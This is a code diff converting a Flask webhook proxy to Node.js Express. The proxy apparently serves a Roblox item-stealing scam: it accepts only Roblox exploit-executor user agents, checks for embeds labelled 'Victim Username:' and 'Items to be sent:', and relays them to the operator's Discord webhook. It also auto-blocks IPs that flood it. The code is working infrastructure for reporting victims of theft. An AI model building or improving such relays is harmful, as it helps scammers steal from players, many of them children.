@@ -1,167 +1,127 @@
+// This is a Node.js (Express) version of your Flask webhook proxy.
 
-from flask import Flask, request, jsonify
-import requests
-import json
-import os
-import time
-from collections import defaultdict
+const express = require("express");
+const rateLimit = require("express-rate-limit");
+const bodyParser = require("body-parser");
+const fs = require("fs");
+const path = require("path");
+const axios = require("axios");
+const app = express();
 
-import sys
-from database import get_webhook
-app = Flask(__name__)
+const BLOCKED_IPS_FILE = path.join(__dirname, "blocked_ips.json");
+const USER_AGENT_FILE = path.join(__dirname, "user_agents.json");
+const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
 
+const ACCEPTED_USER_AGENTS = [
+  "codex android",
+  "vega x android",
+  "appleware ios",
+  "delta android",
+  "fluxus",
+  "arceus x android",
+  "trigon android",
+  "evon android",
+  "alysse android",
+  "delta/v1.0",
+  "roblox/darwinrobloxapp/0.626.1.6260363 (globaldist; robloxdirectdownload)",
+  "hydrogen/v1.0",
+  "hydrogen/v3.0",
+  "roblox/wininet"
+];
 
-DISCORD_WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL")
+app.use(bodyParser.json());
 
-# List of accepted user-agents
-ACCEPTED_USER_AGENTS = [
-    "codex android",
-    "vega x android",
-    "appleware ios",
-    "delta android",
-    "fluxus",
-    "arceus x android",
-    "trigon android",
-    "evon android",
-    "alysse android",
-    "delta/v1.0",
-    "roblox/darwinrobloxapp/0.626.1.6260363 (globaldist; robloxdirectdownload)",
-    "hydrogen/v1.0",
-    "hydrogen/v3.0",
-    "roblox/wininet"
-]
+let BLOCKED_IPS = fs.existsSync(BLOCKED_IPS_FILE) ? JSON.parse(fs.readFileSync(BLOCKED_IPS_FILE)) : [];
+let USER_AGENTS = fs.existsSync(USER_AGENT_FILE) ? JSON.parse(fs.readFileSync(USER_AGENT_FILE)) : {};
 
-BLOCKED_IPS = []
-BLOCKED_IPS_FILE = 'blocked_ips.json'
-USER_AGENT_FILE = 'user_agents.json'
-REQUEST_LIMIT = 3
-TIME_WINDOW = 60
-request_log = defaultdict(list)
+const updateBlockedIPs = () => fs.writeFileSync(BLOCKED_IPS_FILE, JSON.stringify(BLOCKED_IPS));
+const updateUserAgents = () => fs.writeFileSync(USER_AGENT_FILE, JSON.stringify(USER_AGENTS));
 
-initialized = False
+// Middleware to block IPs manually
+app.use((req, res, next) => {
+  const ip = req.ip;
+  if (BLOCKED_IPS.includes(ip)) return res.status(403).json({ error: "Unauthorized" });
+  next();
+});
 
-def load_blocked_ips():
-    if os.path.exists(BLOCKED_IPS_FILE):
-        with open(BLOCKED_IPS_FILE, 'r') as file:
-            return json.load(file)
-    return []
+const requestCounts = new Map();
+const TIME_WINDOW = 60 * 1000;
+const REQUEST_LIMIT = 3;
 
-def save_blocked_ips():
-    with open(BLOCKED_IPS_FILE, 'w') as file:
-        json.dump(BLOCKED_IPS, file)
+// Simple rate-limiting (custom)
+app.use((req, res, next) => {
+  const ip = req.ip;
+  const now = Date.now();
+  if (!requestCounts.has(ip)) requestCounts.set(ip, []);
 
-def load_user_agents():
-    if os.path.exists(USER_AGENT_FILE):
-        with open(USER_AGENT_FILE, 'r') as file:
-            return json.load(file)
-    return {}
+  const timestamps = requestCounts.get(ip).filter(ts => now - ts <= TIME_WINDOW);
+  timestamps.push(now);
+  requestCounts.set(ip, timestamps);
 
-def save_user_agents(user_agents):
-    with open(USER_AGENT_FILE, 'w') as file:
-        json.dump(user_agents, file)
+  if (timestamps.length > REQUEST_LIMIT) {
+    if (!BLOCKED_IPS.includes(ip)) {
+      BLOCKED_IPS.push(ip);
+      updateBlockedIPs();
+    }
+    return res.status(403).json({ error: "Unauthorized" });
+  }
 
-@app.before_request
-def block_ip():
-    global initialized
-    if not initialized:
-        global BLOCKED_IPS
-        BLOCKED_IPS = load_blocked_ips()
-        initialized = True
+  next();
+});
 
-    ip = request.remote_addr
-    
-    current_time = time.time()
-    request_log[ip] = [timestamp for timestamp in request_log[ip] if current_time - timestamp <= TIME_WINDOW]
-    request_log[ip].append(current_time)
+function isValidWebhookRequest(reqBody) {
+  const embeds = reqBody.embeds;
+  if (!Array.isArray(embeds) || embeds.length !== 1 || typeof embeds[0] !== "object") return false;
+  const fields = embeds[0].fields;
+  if (!Array.isArray(fields) || fields.length !== 3) return false;
+  if (fields[0].name !== "Victim Username:" || fields[1].name !== "Items to be sent:" || fields[2].name !== "Summary:") return false;
+  if (fields[0].value.includes(" ") || fields[0].value.length > 20) return false;
+  return true;
+}
 
-    if len(request_log[ip]) > REQUEST_LIMIT:
-        if ip not in BLOCKED_IPS:
-            BLOCKED_IPS.append(ip)
-            save_blocked_ips()
-        return jsonify({'error': 'Unauthorized'}), 403
-    
-    if ip in BLOCKED_IPS:
-        return jsonify({'error': 'Unauthorized'}), 403
+app.post("/postwebhook", async (req, res) => {
+  const userAgent = (req.headers["user-agent"] || "").toLowerCase();
+  const discUser = req.headers["discuser"];
 
-@app.route('/postwebhook', methods=['POST'])
-def send_webhook():
-    user_agent = request.headers.get('User-Agent', '').lower()
-    discUser = request.headers.get('DiscUser', '')
+  if (!ACCEPTED_USER_AGENTS.includes(userAgent)) return res.status(403).json({ error: "Unauthorized" });
 
-    if user_agent not in ACCEPTED_USER_AGENTS:
-        return jsonify({'error': 'Unauthorized'}), 403
+  const body = req.body;
+  if (Object.values(body).some(v => typeof v === "string" && v.includes("@"))) return res.status(403).json({ error: "Unauthorized" });
 
-    request_json = request.get_json()
-    if any('@' in str(value) for value in request_json.values()):
-        return jsonify({'error': 'Unauthorized'}), 403
+  // Replace this with your actual DB lookup logic
+  const webhookUrl = DISCORD_WEBHOOK_URL;
+  if (!webhookUrl) return res.status(403).json({ error: "Unauthorized" });
 
-    webhook_url = get_webhook(discUser)
-    if not webhook_url:
-        return jsonify({'error': 'Unauthorized'}), 403
+  if (!isValidWebhookRequest(body)) return res.status(403).json({ error: "Unauthorized" });
 
-    embeds = request_json.get("embeds", [])
-    if len(embeds) != 1 or not isinstance(embeds[0], dict):
-        return jsonify({'error': 'Unauthorized'}), 403
+  try {
+    const response = await axios.post(webhookUrl, body);
+    res.status(response.status).json({ status: "success" });
+  } catch (err) {
+    res.status(500).json({ error: "Failed to send webhook" });
+  }
+});
 
-    fields = embeds[0].get("fields", [])
-    if len(fields) != 3 or fields[0].get("name") != "Victim Username:":
-        return jsonify({'error': 'Unauthorized'}), 403
+app.post("/webhook", async (req, res) => {
+  const userAgent = (req.headers["user-agent"] || "").toLowerCase();
+  USER_AGENTS[userAgent] = (USER_AGENTS[userAgent] || 0) + 1;
+  updateUserAgents();
 
-    if " " in fields[0].get("value", "hi mate") or len(fields[0].get("value", "thisisover20characters")) > 20:
-        return jsonify({'error': 'Unauthorized'}), 403
-    if fields[1].get("name") != "Items to be sent:":
-        return jsonify({'error': 'Unauthorized'}), 403
-    if fields[2].get("name") != "Summary:":
-        return jsonify({'error': 'Unauthorized'}), 403
+  if (!ACCEPTED_USER_AGENTS.includes(userAgent)) return res.status(403).json({ error: "Unauthorized" });
 
-    # Forward the request to the Discord webhook
-    response = requests.post(webhook_url, json=request_json)
+  const body = req.body;
+  if (Object.values(body).some(v => typeof v === "string" && v.includes("@"))) return res.status(403).json({ error: "Unauthorized" });
 
-    return jsonify({'status': 'success'}), response.status_code
+  if (!isValidWebhookRequest(body)) return res.status(403).json({ error: "Unauthorized" });
 
-@app.route('/webhook', methods=['POST'])
-def proxy_webhook():
-    user_agent = request.headers.get('User-Agent', '').lower()
+  body.embeds[0].fields[0].value = "Username redacted";
 
-    user_agents = load_user_agents()
-    if user_agent in user_agents:
-        user_agents[user_agent] += 1
-    else:
-        user_agents[user_agent] = 1
-    save_user_agents(user_agents)
+  try {
+    const response = await axios.post(DISCORD_WEBHOOK_URL, body);
+    res.status(response.status).json({ status: "success" });
+  } catch (err) {
+    res.status(500).json({ error: "Failed to send webhook" });
+  }
+});
 
-    if user_agent not in ACCEPTED_USER_AGENTS:
-        return jsonify({'error': 'Unauthorized'}), 403
-
-    request_json = request.get_json()
-    if any('@' in str(value) for value in request_json.values()):
-        return jsonify({'error': 'Unauthorized'}), 403
-
-    embeds = request_json.get("embeds", [])
-    if len(embeds) != 1 or not isinstance(embeds[0], dict):
-        return jsonify({'error': 'Unauthorized'}), 403
-
-    fields = embeds[0].get("fields", [])
-    if len(fields) != 3 or fields[0].get("name") != "Victim Username:":
-        return jsonify({'error': 'Unauthorized'}), 403
-
-    if " " in fields[0].get("value", "hi mate") or len(fields[0].get("value", "thisisover20characters")) > 20:
-        return jsonify({'error': 'Unauthorized'}), 403
-    if fields[1].get("name") != "Items to be sent:":
-        return jsonify({'error': 'Unauthorized'}), 403
-    if fields[2].get("name") != "Summary:":
-        return jsonify({'error': 'Unauthorized'}), 403
-    
-    request_json["embeds"][0]["fields"][0]["value"] = "Username redacted"
-
-    # Forward the request to the Discord webhook
-    response = requests.post(DISCORD_WEBHOOK_URL, json=request_json)
-
-    return jsonify({'status': 'success'}), response.status_code
-
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
-
-# Required for Vercel
-def handler(environ, start_response):
-    return app.wsgi_app(environ, start_response)
+module.exports = app;
